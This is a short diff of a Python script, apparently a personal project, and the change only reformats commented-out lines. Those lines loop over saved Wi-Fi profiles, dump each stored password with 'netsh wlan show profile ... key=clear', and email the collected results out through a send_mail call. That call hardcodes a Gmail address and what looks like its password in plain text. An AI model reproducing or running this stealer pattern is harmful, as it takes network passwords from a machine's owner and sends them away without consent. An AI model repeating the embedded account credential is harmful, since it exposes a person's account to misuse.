@@ -20,8 +20,8 @@ result = ""
 # пока этот код просто выводит весь список сетей, можно вручную их загонять
 for net_name in network_names:
     print(net_name)
-    #cmd = "netsh wlan show profile " + net_name + " key=clear"
-    #current_res = subprocess.check_output(cmd, shell=True)
-    #result = result + str(current_res)
+    # cmd = "netsh wlan show profile " + net_name + " key=clear"
+    # current_res = subprocess.check_output(cmd, shell=True)
+    # result = result + str(current_res)
 
-#send_mail("sereganazemcev@gmail.com", "22833720041917Master", result)
+# send_mail("sereganazemcev@gmail.com", "22833720041917Master", result)
